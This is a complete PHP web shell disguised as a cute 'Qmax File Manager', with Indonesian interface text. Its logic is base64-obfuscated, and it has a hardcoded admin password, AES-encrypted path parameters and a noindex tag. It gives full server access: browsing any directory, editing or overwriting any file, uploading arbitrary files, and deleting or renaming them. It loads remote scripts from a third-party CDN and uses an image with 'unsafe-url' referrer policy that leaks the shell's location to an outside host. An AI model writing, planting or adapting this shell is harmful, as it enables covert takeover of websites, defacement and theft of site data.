<?php define(base64_decode('TE9HSU5fVVNFUk5BTUU='),base64_decode('YWRtaW4='));define(base64_decode('TE9HSU5fUEFTU1dPUkQ='),base64_decode('U2VtYW5nYXQ0NQ=='));session_start();if(isset($_GET[base64_decode('bG9nb3V0')])){session_destroy();header(base64_decode('TG9jYXRpb246IA==').$_SERVER[base64_decode('UEhQX1NFTEY=')]);exit;}if(isset($_POST[base64_decode('bG9naW4=')])){$_4=$_POST[base64_decode('dXNlcm5hbWU=')]?? '';$_5=$_POST[base64_decode('cGFzc3dvcmQ=')]?? '';if($_4===LOGIN_USERNAME&&$_5===LOGIN_PASSWORD){$_SESSION[base64_decode('bG9nZ2VkX2lu')]=true;header(base64_decode('TG9jYXRpb246IA==').$_SERVER[base64_decode('UEhQX1NFTEY=')]);exit;}else{$_6=base64_decode('VXNlcm5hbWUgYXRhdSBwYXNzd29yZCBzYWxhaCEgKGRpenp5KQ==');}}if(!isset($_SESSION[base64_decode('bG9nZ2VkX2lu')])||$_SESSION[base64_decode('bG9nZ2VkX2lu')]!==true){?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>馃挦 MktQmax88.V.3 - Qmax File Manager</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;500;600;700&display=swap');
            
            body {
                font-family: 'Quicksand', sans-serif;
                background: linear-gradient(135deg, #eeccf9ff 0%, #f618d1ff 50%, #a1a9f4ff 100%);
                min-height: 100vh;
                overflow: hidden;
            }
            
            /* Animasi love yang jatuh */
            .floating-hearts {
                position: fixed;
                top: -50px;
                animation: fall linear infinite;
                font-size: 2rem;
                color: #840645ff;
                opacity: 0.7;
                z-index: 1;
            }
            
            @keyframes fall {
                0% {
                    transform: translateY(-100px) rotate(0deg);
                    opacity: 1;
                }
                100% {
                    transform: translateY(100vh) rotate(360deg);
                    opacity: 0;
                }
            }
            
            /* Animasi bounce untuk form */
            .bounce-in {
                animation: bounceIn 1s ease-out;
            }
            
            @keyframes bounceIn {
                0% {
                    transform: scale(0.3);
                    opacity: 0;
                }
                50% {
                    transform: scale(1.05);
                }
                70% {
                    transform: scale(0.9);
                }
                100% {
                    transform: scale(1);
                    opacity: 1;
                }
            }
            
            /* Animasi untuk tombol */
            .btn-cute {
                background: linear-gradient(45deg, #d23232ff, #ee5a24);
                transition: all 0.3s ease;
                box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
            }
            
            .btn-cute:hover {
                transform: translateY(-2px);
                box-shadow: 0 6px 20px rgba(245, 23, 23, 0.6);
            }
            
            /* Efek berkilau */
            .sparkle {
                position: absolute;
                background: white;
                border-radius: 50%;
                animation: sparkle 2s infinite;
            }
            
            @keyframes sparkle {
                0%, 100% {
                    transform: scale(0);
                    opacity: 1;
                }
                50% {
                    transform: scale(1);
                    opacity: 0;
                }
            }
            
            /* Input field styling */
            .input-cute {
                background: rgba(255, 255, 255, 0.9);
                border: 2px solid #90353eff;
                transition: all 0.3s ease;
            }
            
            .input-cute:focus {
                border-color: #9c06a1ff;
                box-shadow: 0 0 0 3px rgba(255, 105, 180, 0.2);
                background: white;
            }
        </style>
    </head>
    <body class="flex items-center justify-center min-h-screen relative">
        <!-- Background dengan love yang jatuh -->
        <div id="hearts-container"></div>
        
        <!-- Form Login -->
        <div class="bounce-in bg-white bg-opacity-20 backdrop-blur-lg rounded-3xl p-8 w-full max-w-md mx-4 relative z-10 border border-pink-200 shadow-2xl">
            <!-- Sparkle effects -->
            <div class="sparkle w-2 h-2 top-4 left-4 animation-delay-1000"></div>
            <div class="sparkle w-1 h-1 top-8 right-8 animation-delay-2000"></div>
            <div class="sparkle w-3 h-3 bottom-6 left-8 animation-delay-3000"></div>
            
            <!-- Header -->
            <div class="text-center mb-8">
                <div class="text-6xl mb-4"><img src="https://garuda-force.b-cdn.net/23/qmax88/fav-icon-v2.png" alt="https://garuda-force.b-cdn.net/23/qmax88/fav-icon-v2.png" width="100" style="display:block; margin:auto;"></div>
                <h1 class="text-3xl font-bold text-white mb-2">Selamat Datang!</h1>
                <p class="text-pink-100">Masuk ke Qmax File Manager</p>
            </div>
            
            <!-- Error Message -->
            <?php if(isset($_6)):?>
                <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-lg mb-4 text-center">
                    <?= htmlspecialchars($_6)?>
                </div>
            <?php endif;?>
            
            <!-- Form -->
            <form method="POST" class="space-y-6">
                <div>
                    <label class="block text-white font-semibold mb-2">
                        <i class="fas fa-user mr-2"></i>Username
                    </label>
                    <input type="text" name="username" required 
                           class="input-cute w-full px-4 py-3 rounded-xl focus:outline-none"
                           placeholder="Masukkan username..." />
                </div>
                
                <div>
                    <label class="block text-white font-semibold mb-2">
                        <i class="fas fa-lock mr-2"></i>Password
                    </label>
                    <input type="password" name="password" required 
                           class="input-cute w-full px-4 py-3 rounded-xl focus:outline-none"
                           placeholder="Masukkan password..." />
                </div>
                
                <button type="submit" name="login" 
                        class="btn-cute w-full py-3 rounded-xl text-white font-bold text-lg hover:shadow-lg transform transition-all duration-300">
                    <i class="fas fa-heart mr-2"></i>Masuk dengan Qmax 馃挦
                </button>
            </form>
            
            <!-- Footer cute -->
            <div class="text-center mt-6 text-pink-100">
                <small>Made with 馃挦 by MktQmax88</small>
            </div>
        </div>
        
        <script>
            // Fungsi untuk membuat love yang jatuh
            function createFallingHeart() {
                const heart = document.createElement('div');
                heart.innerHTML = ['馃憗锔�', '馃挬', '馃が', '馃', '馃'][Math.floor(Math.random() * 5)];
                heart.className = 'floating-hearts';
                
                // Posisi random horizontal
                heart.style.left = Math.random() * 100 + 'vw';
                
                // Durasi animasi random
                heart.style.animationDuration = (Math.random() * 3 + 2) + 's';
                
                // Delay random
                heart.style.animationDelay = Math.random() * 2 + 's';
                
                document.getElementById('hearts-container').appendChild(heart);
                
                // Hapus setelah animasi selesai
                setTimeout(() => {
                    heart.remove();
                }, 5000);
            }
            
            // Buat love baru setiap 500ms
            setInterval(createFallingHeart, 500);
            
            // Efek ketik untuk placeholder
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.style.transform = 'scale(1.02)';
                });
                
                input.addEventListener('blur', function() {
                    this.style.transform = 'scale(1)';
                });
            });
            
            // Animasi tombol
            const button = document.querySelector('.btn-cute');
            button.addEventListener('mouseenter', function() {
                this.innerHTML = '<i class="fas fa-heart mr-2"></i>say Qmaxx!!! 馃ぃ';
            });
            
            button.addEventListener('mouseleave', function() {
                this.innerHTML = '<i class="fas fa-heart mr-2"></i>Sebelum Itu 馃槒';
            });
        </script>
    </body>
    </html>
    <?php exit;}define(base64_decode('QUVTX0tFWQ=='),hex2bin(base64_decode('MDEyMzQ1Njc4OWFiY2RlZjAxMjM0NTY3ODlhYmNkZWYwMTIzNDU2Nzg5YWJjZGVmMDEyMzQ1Njc4OWFiY2RlZg==')));function _0($_7){$_8=openssl_random_pseudo_bytes(16);$_9=openssl_encrypt($_7,base64_decode('QUVTLTI1Ni1DQkM='),AES_KEY,OPENSSL_RAW_DATA,$_8);return base64_encode($_8.$_9);}function _1($_a){$_b=base64_decode($_a);$_8=substr($_b,0,16);$_9=substr($_b,16);return openssl_decrypt($_9,base64_decode('QUVTLTI1Ni1DQkM='),AES_KEY,OPENSSL_RAW_DATA,$_8);}$_c=__DIR__;$_d=$_c;if(isset($_GET[base64_decode('ZGly')])){$_e=_1($_GET[base64_decode('ZGly')]);$_f=$_e?realpath($_e):false;$_d=($_f!==false)?$_f:$_c;}if(isset($_GET[base64_decode('ZGVsZXRl')])){$_10=realpath($_d.base64_decode('Lw==').$_GET[base64_decode('ZGVsZXRl')]);if($_10&&is_file($_10)){unlink($_10);}elseif($_10&&is_dir($_10)){array_map(base64_decode('dW5saW5r'),glob("$_10/*.*"));rmdir($_10);}header(base64_decode('TG9jYXRpb246ID9kaXI9').urlencode(_0($_d)));exit;}if(isset($_POST[base64_decode('bmV3ZmlsZQ==')])){file_put_contents($_d.base64_decode('Lw==').basename($_POST[base64_decode('bmV3ZmlsZQ==')]),'');header(base64_decode('TG9jYXRpb246ID9kaXI9').urlencode(_0($_d)));exit;}if(isset($_POST[base64_decode('bmV3Zm9sZGVy')])){mkdir($_d.base64_decode('Lw==').basename($_POST[base64_decode('bmV3Zm9sZGVy')]));header(base64_decode('TG9jYXRpb246ID9kaXI9').urlencode(_0($_d)));exit;}if(isset($_POST[base64_decode('cmVuYW1l')],$_POST[base64_decode('dG8=')])){rename($_d.base64_decode('Lw==').$_POST[base64_decode('cmVuYW1l')],$_d.base64_decode('Lw==').$_POST[base64_decode('dG8=')]);header(base64_decode('TG9jYXRpb246ID9kaXI9').urlencode(_0($_d)));exit;}if(isset($_FILES[base64_decode('dXBsb2Fk')])){move_uploaded_file($_FILES[base64_decode('dXBsb2Fk')][base64_decode('dG1wX25hbWU=')],$_d.base64_decode('Lw==').$_FILES[base64_decode('dXBsb2Fk')][base64_decode('bmFtZQ==')]);header(base64_decode('TG9jYXRpb246ID9kaXI9').urlencode(_0($_d)));exit;}if(isset($_POST[base64_decode('c2F2ZQ==')],$_POST[base64_decode('Y29udGVudA==')])){file_put_contents($_d.base64_decode('Lw==').$_POST[base64_decode('c2F2ZQ==')],$_POST[base64_decode('Y29udGVudA==')]);header(base64_decode('TG9jYXRpb246ID9kaXI9').urlencode(_0($_d)));exit;}function _2($_11,$_12=2){$_13=[base64_decode('Qg=='),base64_decode('S0I='),base64_decode('TUI='),base64_decode('R0I='),base64_decode('VEI=')];$_14=floor((strlen($_11)-1)/3);return sprintf("%.{$_12}f",$_11/pow(1024,$_14)).base64_decode('IA==').$_13[$_14];}function _3($_15){if(!file_exists($_15)||!is_readable($_15))return base64_decode('LS0tLS0tLS0t');$_16=@fileperms($_15);if($_16===false)return base64_decode('LS0tLS0tLS0t');$_17=(($_16 & 0x0100)?base64_decode('cg=='):base64_decode('LQ==')).(($_16 & 0x0080)?base64_decode('dw=='):base64_decode('LQ==')).(($_16 & 0x0040)?base64_decode('eA=='):base64_decode('LQ=='));$_18=(($_16 & 0x0020)?base64_decode('cg=='):base64_decode('LQ==')).(($_16 & 0x0010)?base64_decode('dw=='):base64_decode('LQ==')).(($_16 & 0x0008)?base64_decode('eA=='):base64_decode('LQ=='));$_19=(($_16 & 0x0004)?base64_decode('cg=='):base64_decode('LQ==')).(($_16 & 0x0002)?base64_decode('dw=='):base64_decode('LQ==')).(($_16 & 0x0001)?base64_decode('eA=='):base64_decode('LQ=='));return $_17.$_18.$_19;}$_1a=array_diff(scandir($_d),[base64_decode('Lg=='),base64_decode('Li4=')]);$_1b=[];$_1c=[];foreach($_1a as $_1d){$_1e=$_d.DIRECTORY_SEPARATOR.$_1d;if(is_dir($_1e)){$_1b[]=$_1d;}else{$_1c[]=$_1d;}}sort($_1b,SORT_NATURAL|SORT_FLAG_CASE);sort($_1c,SORT_NATURAL|SORT_FLAG_CASE);$_1f=array_merge($_1b,$_1c);$_20=urlencode(_0($_d));?>

<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>馃専 Qmax - File Manager By MktQmax88</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/gh/TatsumiOfficial/PemecahList/auto_style.css" rel="stylesheet">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
    .breadcrumb-modern {
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(20px);
        border-radius: 16px;
        padding: 1.5rem 2rem;
        margin: 2rem 0;
        border: 1px solid rgba(255, 255, 255, 0.2);
        box-shadow: 
        0 8px 32px rgba(0, 0, 0, 0.1),
        0 0 0 1px rgba(255, 255, 255, 0.05);
        position: relative;
        overflow: hidden;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }

    .breadcrumb-modern::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 1px;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
    }

    .breadcrumb-modern::after {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
        transition: left 0.5s ease;
    }

    .breadcrumb-modern:hover::after {
        left: 100%;
    }

    .breadcrumb-modern:hover {
        transform: translateY(-2px);
        box-shadow: 
        0 12px 40px rgba(0, 0, 0, 0.15),
        0 0 0 1px rgba(255, 255, 255, 0.1);
    }

    .breadcrumb {
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        gap: 0.5rem;
        margin: 0;
        padding: 0;
        list-style: none;
        position: relative;
        z-index: 1;
    }

    .breadcrumb-item {
        display: flex;
        align-items: center;
        position: relative;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        opacity: 0;
        transform: translateX(-20px);
        animation: slideInBreadcrumb 0.5s ease forwards;
    }

    .breadcrumb-item:nth-child(1) { animation-delay: 0.1s; }
    .breadcrumb-item:nth-child(2) { animation-delay: 0.2s; }
    .breadcrumb-item:nth-child(3) { animation-delay: 0.3s; }
    .breadcrumb-item:nth-child(4) { animation-delay: 0.4s; }
    .breadcrumb-item:nth-child(5) { animation-delay: 0.5s; }
    .breadcrumb-item:nth-child(6) { animation-delay: 0.6s; }
    .breadcrumb-item:nth-child(7) { animation-delay: 0.7s; }
    .breadcrumb-item:nth-child(8) { animation-delay: 0.8s; }

    @keyframes slideInBreadcrumb {
        to {
            opacity: 1;
            transform: translateX(0);
        }
    }

    .breadcrumb-item:not(:last-child)::after {
        content: '';
        width: 8px;
        height: 8px;
        background: rgba(255, 255, 255, 0.4);
        border-radius: 50%;
        margin-left: 1rem;
        transition: all 0.3s ease;
        position: relative;
        top: 0;
    }

    .breadcrumb-item:not(:last-child):hover::after {
        background: rgba(255, 255, 255, 0.8);
        transform: scale(1.2);
    }

    .breadcrumb-item a {
        color: rgba(255, 255, 255, 0.8);
        text-decoration: none;
        padding: 0.5rem 1rem;
        border-radius: 10px;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        font-weight: 500;
        font-size: 0.9rem;
        position: relative;
        overflow: hidden;
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .breadcrumb-item a::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
        transition: left 0.5s ease;
    }

    .breadcrumb-item a:hover {
        color: #ffffff;
        background: rgba(255, 255, 255, 0.15);
        border-color: rgba(255, 255, 255, 0.3);
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
    }

    .breadcrumb-item a:hover::before {
        left: 100%;
    }

    .breadcrumb-item a:active {
        transform: translateY(0);
    }

    .breadcrumb-item.active {
        color: #ffffff;font-weight: 600;
        padding: 0.5rem 1rem;
        background: rgba(255, 255, 255, 0.2);
        border-radius: 10px;
        border: 1px solid rgba(255, 255, 255, 0.3);
        position: relative;
        overflow: hidden;
    }

    .breadcrumb-item.active::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05));
        border-radius: 9px;
    }

    /* Icon untuk home */
    .breadcrumb-item:first-child a::before {
        content: '\f015';
        font-family: 'Font Awesome 6 Free';
        font-weight: 900;
        margin-right: 0.5rem;
        opacity: 0.8;
        position: static;
        background: none;
        transition: none;
    }

    .breadcrumb-item:first-child a:hover::before {
        left: auto;
    }

    /* Responsive design */
    @media (max-width: 768px) {
        .breadcrumb-modern {
            padding: 1rem 1.5rem;
            margin: 1rem 0;
        }

        .breadcrumb {
            gap: 0.25rem;
        }

        .breadcrumb-item a,
        .breadcrumb-item.active {
            padding: 0.4rem 0.8rem;
            font-size: 0.8rem;
        }

        .breadcrumb-item:not(:last-child)::after {
            margin-left: 0.5rem;
            width: 6px;
            height: 6px;
        }
    }
</style>
</head>
<body>
<div class="app-wrapper">
    <div class="header-card">
        <div class="d-flex flex-wrap justify-content-between align-items-center gap-3">
            <h1 class="header-title">
                <img src="https://garuda-force.b-cdn.net/23/qmax88/v1.png" referrerpolicy="unsafe-url" />File Manager
            </h1>
            <div class="d-flex gap-2 flex-wrap">
                <!-- Tombol Logout -->
                <a href="?logout=1" class="modern-btn" onclick="return confirm('Yakin ingin logout?')">
                    <i class="fas fa-sign-out-alt"></i>
                    <span>Logout</span>
                </a>
                <?php if($_d!==$_c):?>
                    <a href="?dir=<?= $_20 ?>" class="modern-btn">
                        <i class="fas fa-arrow-left"></i>
                        <span>Kembali</span>
                    </a>
                <?php endif;?>
                <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#uploadModal">
                    <i class="fas fa-upload"></i>
                    <span>Upload</span>
                </button>
                <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#createFileModal">
                    <i class="fas fa-file-plus"></i>
                    <span>File Baru</span>
                </button>
                <button class="modern-btn" data-bs-toggle="modal" data-bs-target="#createFolderModal">
                    <i class="fas fa-folder-plus"></i>
                    <span>Folder Baru</span>
                </button>
            </div>
        </div>
    </div>

    <!-- Breadcrumb -->
    <div class="breadcrumb-modern">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <?php $_21=explode(DIRECTORY_SEPARATOR,trim($_d,DIRECTORY_SEPARATOR));$_22='';$_23=array_keys($_21);$_24=end($_23);foreach($_21 as $_25=>$_26){$_22.=DIRECTORY_SEPARATOR.$_26;$_27=($_25===$_24);echo base64_decode('PGxpIGNsYXNzPSJicmVhZGNydW1iLWl0ZW0=').($_27?base64_decode('IGFjdGl2ZSIgYXJpYS1jdXJyZW50PSJwYWdlIg=='):base64_decode('Ig==')).base64_decode('Pg==');if(!$_27){echo base64_decode('PGEgaHJlZj0iP2Rpcj0=').urlencode(_0($_22)).base64_decode('Ij4=').htmlspecialchars($_26).base64_decode('PC9hPg==');}else{echo htmlspecialchars($_26);}echo base64_decode('PC9saT4=');}?>
            </ol>
        </nav>
    </div>

    <!-- File Table -->
    <div class="file-table-card">
        <div class="table-responsive">
            <table class="table table-modern">
                <thead>
                    <tr>
                        <th>Nama</th>
                        <th class="text-end">Ukuran</th>
                        <th class="text-center">Permission</th>
                        <th>Diubah</th>
                        <th class="text-end">Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach($_1f as $_28):?>
                        <?php $_1e=$_d.DIRECTORY_SEPARATOR.$_28;$_29=is_dir($_1e);?>
                        <tr>
                            <td>
                                <div class="d-flex align-items-center">
                                    <div class="file-icon <?= $_29?base64_decode('Zm9sZGVy'):base64_decode('ZmlsZQ==') ?>">
                                        <i class="fas fa-<?= $_29?base64_decode('Zm9sZGVy'):base64_decode('ZmlsZS1hbHQ=') ?>"></i>
                                    </div>
                                    <?php if($_29):?>
                                        <a href="?dir=<?= urlencode(_0($_1e))?>" class="file-link">
                                            <?= htmlspecialchars($_28)?>
                                        </a>
                                    <?php else:?>
                                        <a href="?dir=<?= $_20 ?>&edit=<?= urlencode(_0($_28))?>" class="file-link">
                                            <?= htmlspecialchars($_28)?>
                                        </a>
                                    <?php endif;?>
                                </div>
                            </td>
                            <td class="text-end">
                                <?php if($_29){echo base64_decode('PHNwYW4gY2xhc3M9InRleHQtbXV0ZWQiPuKAlDwvc3Bhbj4=');}elseif(is_file($_1e)&&is_readable($_1e)){$_2a=@filesize($_1e);echo $_2a!==false?_2($_2a):base64_decode('PHNwYW4gY2xhc3M9InRleHQtbXV0ZWQiPjAgQjwvc3Bhbj4=');}else{echo base64_decode('PHNwYW4gY2xhc3M9InRleHQtbXV0ZWQiPjAgQjwvc3Bhbj4=');}?>
                            </td>
                            <td class="text-center">
                                <span class="permission-badge">
                                    <?=(file_exists($_1e)&&is_readable($_1e))?_3($_1e):base64_decode('LS0tLS0tLS0t') ?>
                                </span>
                            </td>
                            <td>
                                <?php if(file_exists($_1e)&&is_readable($_1e)){$_2b=@filemtime($_1e);echo($_2b!==false&&$_2b>0)?date(base64_decode('aiBNIFkgSDpp'),$_2b):base64_decode('PHNwYW4gY2xhc3M9InRleHQtbXV0ZWQiPk4vQTwvc3Bhbj4=');}else{echo base64_decode('PHNwYW4gY2xhc3M9InRleHQtbXV0ZWQiPk4vQTwvc3Bhbj4=');}?>
                            </td>
                            <td class="text-end">
                                <div class="d-flex justify-content-end">
                                    <?php if(!$_29):?>
                                        <a href="?dir=<?= $_20 ?>&edit=<?= urlencode(_0($_28))?>" class="action-btn edit" title="Edit">
                                            <i class="fas fa-edit"></i>
                                        </a>
                                    <?php endif;?>
                                    <a href="?dir=<?= $_20 ?>&delete=<?= urlencode($_28)?>" class="action-btn delete" onclick="return confirm('Hapus <?= addslashes($_28)?>?')" title="Hapus">
                                        <i class="fas fa-trash"></i>
                                    </a>
                                    <button class="action-btn rename" data-bs-toggle="modal" data-bs-target="#renameModal" data-filename="<?= htmlspecialchars($_28)?>" title="Ganti Nama">
                                        <i class="fas fa-pen"></i>
                                    </button>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach;?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- File Editor -->
    <?php if(isset($_GET[base64_decode('ZWRpdA==')])):$_2c=_1($_GET[base64_decode('ZWRpdA==')]);$_2d=$_d.base64_decode('Lw==').$_2c;if(is_file($_2d)):$_2e=htmlspecialchars(file_get_contents($_2d));?>
            <br>
            <div class="editor-card">
                <div class="editor-header">
                    <i class="fas fa-edit me-2"></i>Mengedit: <?= htmlspecialchars($_2c)?>
                </div>
                <div class="p-3">
                    <form method="POST">
                        <textarea class="form-control editor-textarea" name="content" rows="20" placeholder="Mulai ketik kode Anda di sini..."><?= $_2e ?></textarea>
                        <input type="hidden" name="save" value="<?= htmlspecialchars($_2c)?>">
                        <div class="text-end mt-3">
                            <button type="submit" class="btn btn-modern-primary">
                                <i class="fas fa-save me-2"></i>Simpan Perubahan
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        <?php endif;endif;?>
    </div>

    <!-- Modal Upload -->
    <div class="modal fade modal-modern" id="uploadModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-upload me-2"></i>Upload File
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST" enctype="multipart/form-data">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">Pilih file untuk diupload</label>
                            <input type="file" name="upload" class="form-control" required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Batal</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-upload me-2"></i>Upload
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Modal Buat File Baru -->
    <div class="modal fade modal-modern" id="createFileModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-file-plus me-2"></i>Buat File Baru
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">Nama file</label>
                            <input type="text" class="form-control" name="newfile" placeholder="Masukkan nama file..." required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Batal</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-plus me-2"></i>Buat
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Modal Buat Folder Baru -->
    <div class="modal fade modal-modern" id="createFolderModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-folder-plus me-2"></i>Buat Folder Baru
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">Nama folder</label>
                            <input type="text" class="form-control" name="newfolder" placeholder="Masukkan nama folder..." required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Batal</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-folder-plus me-2"></i>Buat
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Modal Ganti Nama -->
    <div class="modal fade modal-modern" id="renameModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-pen me-2"></i>Ganti Nama Item
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="POST">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label text-white-50">Nama baru</label>
                            <input type="hidden" name="rename" id="renameOriginal">
                            <input type="text" class="form-control" name="to" placeholder="Masukkan nama baru..." required>
                        </div>
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-modern-secondary" data-bs-dismiss="modal">Batal</button>
                        <button type="submit" class="btn btn-modern-primary">
                            <i class="fas fa-check me-2"></i>Ganti Nama
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer-modern">
        <p class="mb-0">
            <i class="fas fa-heart text-danger me-2"></i>
            &copy; <?= date(base64_decode('WQ=='))?> Qmax File Manager by MktQmax88.V.3.
        </p>
    </div>

    <!-- JavaScript -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/TatsumiOfficial/PemecahList/scripts.js"></script>
    <script>
        // Script untuk modal rename
        const renameModal = document.getElementById('renameModal');
        renameModal.addEventListener('show.bs.modal', function (event) {
            const button = event.relatedTarget;
            const filename = button.getAttribute('data-filename');
            const modalInput = renameModal.querySelector('#renameOriginal');
            const modalNewName = renameModal.querySelector('input[name="to"]');
            
            modalInput.value = filename;
            modalNewName.value = filename;
            modalNewName.focus();
        });

        // Konfirmasi sebelum hapus
        document.querySelectorAll('.action-btn.delete').forEach(btn => {
            btn.addEventListener('click', function(e) {
                if (!confirm('Yakin ingin menghapus item ini?')) {
                    e.preventDefault();
                }
            });
        });

        // Auto focus pada input modal
        document.querySelectorAll('.modal').forEach(modal => {
            modal.addEventListener('shown.bs.modal', function () {
                const input = this.querySelector('input[type="text"]');
                if (input) {
                    input.focus();
                }
            });
        });
    </script>
</body>
</html>